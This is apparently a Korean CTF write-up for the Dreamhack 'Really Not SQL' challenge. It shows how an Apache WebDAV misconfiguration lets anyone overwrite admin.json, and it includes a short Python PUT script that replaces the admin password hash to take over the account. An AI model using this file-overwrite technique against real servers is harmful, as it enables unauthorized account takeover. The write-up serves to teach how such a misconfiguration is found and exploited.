---
layout: post
title: "[DH]Really Not SQL"
date: 2025-08-07 12:04 +0900
---
### **INFO**
![chall]
_Fig 1. Challenge_

보안적으로 취약한 설정을 찾아, 파일 덮어쓰기를 통해 익스플로잇을 하는 문제이다.

### **RECON**
아파치-PHP 스택을 사용하는 웹 서버의 내부 코드가 주어진다. 
이떄, admin, guest의 계정이 주어진 것을 확인할 수 있으며, admin으로 로그인하면 flag.php를 통해 서버 내부의 플래그 값을 입력할 수 있다.

### **SOLUTION**
admin 게정은 json으로 관리되며, /var/www/http/user/admin.json 경로로 접근이 가능하다.

edit_profile.php 파일에서 계정의 비밀번호를 수정할 수 있는 기능이 존재하지만, admin 계정의 세션 인증이 필요하기 때문에 접근할 수 없다.

서버의 설정 파일을 확인해보자. 아파치 웹 서버에서 기본적으로 생성되는 000-default.conf 파일을 보면, `/var/www/http/user` 경로에 취약하게 설정이 된 것을 확인할 수 있다.

```js
  <Directory /var/www/html/user/>
      DAV On                    // WebDav 기능 활성화
      Options Indexes           // index.html(.php) 가 없으면 파일리스트 출력
      AllowOverride All         // .htaccess 파일을 통한 설정 덮어쓰기 허용
      Require all granted       // 누구에게나 해당 폴더 접근 허용
  </Directory>
```

WebDav에 대한 설명은 다음 [링크](https://umbum.dev/562/)를 참고하길 바란다. 

### **POC**

DAV On 설정을 통해 /var/www/html/user 경로에 파일을 덮어쓸 수도, 파일을 새로 올릴 수도 있다.

admin 계정으로 로그인하는 것이 목표이기 때문에, 파일 업로드 공격을 시도했다.

임의의 비밀번호를 sha-256 해시한 값을 업로드할 json 파일에 넣고, requests로 서버에 업로드하였다.

```json
{"no": 0, "id": "admin", "password": "{NEW_PASSWORD}"}
```

```py
import requests

url = "http://host8.dreamhack.games:24093/user/admin.json"


file_path = './new_admin.json'

with open(file_path, 'rb') as f:
    res = requests.put(url, data=f)

print(f'HTTP 상태 코드: {res.status_code}')
if res.status_code in [200, 201, 204]:
    print('파일 업로드(수정) 성공!')
else:
    print('업로드 실패')
```

이제 admin 계정으로 로그인이 가능해지며, flag.php 경로를 입력하면 플래그를 획득할 수 있다.

![login]

[chall]: /assets/DreamHack/reallynotsql/challenge.png
[login]: /assets/DreamHack/reallynotsql/solution_login.png
[chall]: /assets/DreamHack/reallynotsql/challenge.png
[chall]: /assets/DreamHack/reallynotsql/challenge.png